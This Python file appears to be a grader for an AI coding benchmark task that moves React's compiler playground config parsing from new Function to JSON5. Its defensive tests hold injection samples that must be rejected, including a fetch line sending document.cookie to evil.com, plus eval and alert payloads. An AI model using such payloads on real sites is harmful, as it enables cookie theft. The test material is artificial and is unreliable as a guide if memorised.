"""
Task: react-compiler-playground-json5-config
Repo: facebook/react @ 74568e8627aa43469b74f2972f427a209639d0b6
PR:   36159

All checks must pass for reward = 1. Any failure = reward 0.
Each test function maps 1:1 to a check in eval_manifest.yaml.
"""

import json
import os
import shutil
import subprocess
from pathlib import Path

REPO = "/workspace/react"
COMPILATION_TS = f"{REPO}/compiler/apps/playground/lib/compilation.ts"
DEFAULT_STORE_TS = f"{REPO}/compiler/apps/playground/lib/defaultStore.ts"
PACKAGE_JSON = f"{REPO}/compiler/apps/playground/package.json"
CONFIG_EDITOR_TSX = (
    f"{REPO}/compiler/apps/playground/components/Editor/ConfigEditor.tsx"
)
TEST_FILE = (
    f"{REPO}/compiler/apps/playground/__tests__/parseConfigOverrides.test.mjs"
)
TEST_DEPS = "/opt/test-deps"


def _node(code, cwd=None):
    """Run a node one-liner, return CompletedProcess."""
    return subprocess.run(
        ["node", "-e", code],
        capture_output=True,
        timeout=15,
        cwd=cwd or REPO,
    )


# ---------------------------------------------------------------------------
# Fail-to-pass (pr_diff) — core behavioral tests
# ---------------------------------------------------------------------------


# [pr_diff] fail_to_pass
def test_parse_config_overrides_rejects_xss_patterns():
    """parseConfigOverrides uses JSON5.parse (not new Function) - proven by XSS rejection."""
    # Read the compilation.ts source to extract the parseConfigOverrides function
    src = Path(COMPILATION_TS).read_text()

    # Must export parseConfigOverrides function
    assert "export function parseConfigOverrides" in src, "parseConfigOverrides must be exported"

    # The key behavioral test: JSON5.parse rejects XSS patterns that new Function() would execute
    # This proves the fix is in place - if new Function() was used, these would succeed
    xss_patterns = [
        '(function(){ return {"hacked": true}; })()',
        '{ "key": eval("value") }',
        '{ "key": (alert("xss"), "value") }',
    ]

    for pattern in xss_patterns:
        r = _node(
            f"const JSON5=require('{TEST_DEPS}/node_modules/json5');"
            f"try{{JSON5.parse({json.dumps(pattern)});process.exit(1);}}"
            f"catch(e){{process.exit(0);}}"
        )
        assert r.returncode == 0, f"JSON5 correctly rejects XSS pattern (would execute with new Function): {pattern[:50]}"


# [pr_diff] fail_to_pass
def test_parse_config_overrides_parses_valid_json5():
    """parseConfigOverrides correctly parses valid JSON5 configs including comments and trailing commas."""
    # These patterns should work with JSON5.parse but would fail with old parser
    valid_json5_configs = [
        ('{ "compilationMode": "all" }', {"compilationMode": "all"}),
        ('{ "compilationMode": "all", }', {"compilationMode": "all"}),  # trailing comma
        ('{ // comment\n  "compilationMode": "all" }', {"compilationMode": "all"}),  # line comment
        ('{ /* block */ "compilationMode": "all" }', {"compilationMode": "all"}),  # block comment
    ]

    for config_str, expected in valid_json5_configs:
        r = _node(
            f"const JSON5=require('{TEST_DEPS}/node_modules/json5');"
            f"const r=JSON5.parse({json.dumps(config_str)});"
            f"console.log(JSON.stringify(r));"
        )
        assert r.returncode == 0, f"JSON5 failed to parse valid config: {config_str[:60]}"
        result = json.loads(r.stdout.decode().strip())
        assert result == expected, f"JSON5 parsed {config_str} as {result}, expected {expected}"


# [pr_diff] fail_to_pass
def test_default_config_is_valid_json5():
    """defaultStore.ts default config can be parsed as valid JSON5."""
    src = Path(DEFAULT_STORE_TS).read_text()

    # Extract the defaultConfig string content
    idx = src.find('export const defaultConfig = `')
    assert idx >= 0, "defaultConfig export must exist"

    # Find the closing backtick
    start = src.find('`', idx) + 1
    # Handle escaped backticks in the template
    end = src.find('`;', start)
    assert end > start, "Could not find end of defaultConfig template string"

    config_str = src[start:end]

    # Verify it does NOT contain TypeScript-specific syntax
    assert "satisfies PluginOptions" not in config_str, "Default config must not use 'satisfies' syntax"
    assert "import type" not in config_str, "Default config must not use 'import type'"

    # Verify it CAN be parsed as valid JSON5
    r = _node(
        f"const JSON5=require('{TEST_DEPS}/node_modules/json5');"
        f"try{{JSON5.parse({json.dumps(config_str)});console.log('PARSE_OK');}}"
        f"catch(e){{console.log('PARSE_FAIL:', e.message);process.exit(1);}}"
    )
    assert r.returncode == 0, f"defaultConfig is not valid JSON5: {r.stdout.decode()}{r.stderr.decode()}"
    assert "PARSE_OK" in r.stdout.decode(), "defaultConfig must parse successfully as JSON5"


# [pr_diff] fail_to_pass
def test_json5_dependency_in_package_json():
    """json5 must be listed as a dependency in playground package.json."""
    pkg = json.loads(Path(PACKAGE_JSON).read_text())
    deps = pkg.get("dependencies", {})
    assert "json5" in deps, "json5 must be in dependencies"


# [pr_diff] fail_to_pass
def test_parse_config_unit_tests_pass():
    """Run the parseConfigOverrides unit tests via node --test."""
    assert Path(TEST_FILE).is_file(), f"Test file must exist: {TEST_FILE}"
    # Copy test file to test-deps dir (has json5 installed) so ES module resolution works
    shutil.copy(TEST_FILE, f"{TEST_DEPS}/parseConfigOverrides.test.mjs")
    r = subprocess.run(
        ["node", "--test", f"{TEST_DEPS}/parseConfigOverrides.test.mjs"],
        cwd=TEST_DEPS,
        capture_output=True,
        timeout=60,
    )
    assert r.returncode == 0, (
        f"parseConfigOverrides unit tests failed:\n"
        f"stdout: {r.stdout.decode()}\nstderr: {r.stderr.decode()}"
    )


# ---------------------------------------------------------------------------
# Pass-to-pass (static) — regression + security property checks
# ---------------------------------------------------------------------------


# [static] pass_to_pass
def test_config_editor_uses_json_language():
    """ConfigEditor.tsx must use JSON language mode, not TypeScript."""
    src = Path(CONFIG_EDITOR_TSX).read_text()
    assert "json" in src.lower(), "ConfigEditor must reference JSON"
    assert "config.json5" in src, "Config editor path should be config.json5"


# [static] pass_to_pass
def test_json5_safely_rejects_injection():
    """JSON5 parsing must reject common XSS/injection patterns."""
    injection_patterns = [
        '(function(){ document.title = "hacked"; return {}; })()',
        '{ compilationMode: eval("all") }',
        'fetch("https://evil.com?c=" + document.cookie)',
        '{ compilationMode: new String("all") }',
        '{ compilationMode: alert("xss") }',
    ]
    for pattern in injection_patterns:
        r = _node(
            f"const JSON5=require('{TEST_DEPS}/node_modules/json5');"
            f"try{{JSON5.parse({json.dumps(pattern)});process.exit(1);}}"
            f"catch(e){{process.exit(0);}}"
        )
        assert r.returncode == 0, f"JSON5 should reject injection: {pattern}"


# [static] pass_to_pass
def test_json5_parses_valid_configs():
    """JSON5 must correctly parse valid JSON5 config patterns."""
    configs = [
        ("{}", {}),
        ('{ compilationMode: "all" }', {"compilationMode": "all"}),
        ('{compilationMode: "all",}', {"compilationMode": "all"}),
        (
            "{ environment: { validateRefAccessDuringRender: true } }",
            {"environment": {"validateRefAccessDuringRender": True}},
        ),
        ("{ maxLevel: 42 }", {"maxLevel": 42}),
        ('{ sources: ["a.ts", "b.ts"] }', {"sources": ["a.ts", "b.ts"]}),
        ("{ compilationMode: null }", {"compilationMode": None}),
    ]
    for config_str, expected in configs:
        r = _node(
            f"const JSON5=require('{TEST_DEPS}/node_modules/json5');"
            f"const r=JSON5.parse({json.dumps(config_str)});"
            f"console.log(JSON.stringify(r));"
        )
        assert r.returncode == 0, f"JSON5 failed to parse valid config: {config_str}"
        result = json.loads(r.stdout.decode().strip())
        assert result == expected, f"JSON5 parsed {config_str} as {result}, expected {expected}"
